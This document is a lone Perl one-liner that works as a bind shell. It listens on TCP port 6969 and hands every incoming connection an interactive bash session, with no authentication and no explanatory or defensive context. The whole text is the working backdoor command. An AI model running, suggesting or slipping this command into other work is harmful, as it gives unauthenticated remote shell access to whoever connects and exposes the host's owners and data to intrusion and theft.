perl -MIPC::Open3 -MIO::Socket::INET -e '$s = IO::Socket::INET->new(Listen => 1, LocalPort => 6969); while(1) { $c = $s->accept; $f = fileno $c; open3("<&$f", ">&$f", ">&$f", "bash", "-il");}'
